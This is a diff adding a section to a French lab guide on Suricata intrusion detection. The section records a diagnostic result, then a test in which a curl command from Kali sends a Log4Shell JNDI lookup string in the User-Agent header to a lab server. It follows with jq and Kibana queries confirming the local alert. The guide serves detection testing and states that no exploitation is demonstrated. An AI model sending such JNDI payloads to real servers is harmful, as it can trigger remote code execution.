@@ -237,6 +237,49 @@ sudo tail -n 2000 /var/log/suricata/eve.json | jq -Rrc 'fromjson? // {"diagnosti
 
 Cette dernière commande examine seulement un échantillon récent ; elle ne remplace pas une validation complète du fichier. Un JSON invalide peut aussi faire échouer le processeur JSON du pipeline Elasticsearch si syslog-ng transmet la ligne. Vérifier les erreurs d'ingestion après identification de la ligne.
 
+
+## 7.2. Résultat du diagnostic et preuve de détection JNDI
+
+Le contrôle Python de la ligne 24521 a révélé des octets nuls (`\x00`) au début de la ligne examinée. La cause n'est pas établie. Un contrôle séparé des 2 000 dernières lignes a ensuite donné **0 ligne JSON invalide et 0 alerte** dans cet échantillon. Cela confirme la validité de cet échantillon seulement ; le fichier complet n'a pas été réparé ni déclaré intégralement valide.
+
+Un nouveau test a alors été effectué avec la règle locale SID 1000002. Depuis Kali :
+
+```bash
+curl -A '${jndi:ldap://192.168.56.101:1389/test}' http://192.168.56.10/
+```
+
+La chaîne JNDI est envoyée dans le User-Agent HTTP. Le test vérifie la signature Suricata ; il ne démontre ni une exploitation Log4j ni une connexion LDAP du serveur.
+
+Sur Ubuntu, afficher le résultat :
+
+```bash
+sudo tail -n 2000 /var/log/suricata/eve.json |
+jq -c 'select(.event_type == "alert" and .alert.signature_id == 1000002) |
+{timestamp,src_ip,dest_ip,signature_id:.alert.signature_id,signature:.alert.signature}'
+```
+
+![Détection de la tentative JNDI dans EVE](images/suricata-alerte-jndi.png)
+
+**Lecture de la preuve :**
+
+| Champ | Valeur observée | Interprétation |
+| --- | --- | --- |
+| timestamp | 2026-09-30T22:07:49.444574-0400 | Heure de l'événement avec fuseau UTC−4 |
+| src_ip | 192.168.56.101 | Kali, à l'origine de la requête |
+| dest_ip | 192.168.56.10 | Serveur Ubuntu ciblé |
+| signature_id | 1000002 | Règle JNDI du fichier local.rules |
+| signature | Tentative Log4Shell - JNDI | Nom de la signature déclenchée |
+
+Cette capture confirme une **alerte locale Suricata dans EVE** après le nouveau test. La présence du même événement dans Elasticsearch/Kibana reste à contrôler pour établir la collecte de bout en bout.
+
+Dans Discover, sélectionner la vue couvrant `lab-syslog-ids`, puis une plage absolue incluant l'événement (par exemple le 30 septembre 2026 de 22:05 à 22:10 si Kibana affiche UTC−4 ; de 02:05 à 02:10 le 1er octobre en UTC). Utiliser :
+
+```text
+suricata.event_type : "alert" and suricata.alert.signature_id : 1000002 and source.ip : "192.168.56.101"
+```
+
+Développer le document et vérifier `@timestamp`, `source.ip`, `destination.ip`, `suricata.alert.signature_id` et `suricata.alert.signature`. Une capture de ce document permettra de relier la preuve locale à l'événement indexé.
+
 ## Référence
 
 [Guide officiel Suricata 7.0.3](https://docs.suricata.io/en/suricata-7.0.3/quickstart.html) : configuration de l'interface, gestion des signatures, service et lecture EVE. Les paramètres et captures ci-dessus décrivent le laboratoire effectivement fourni.
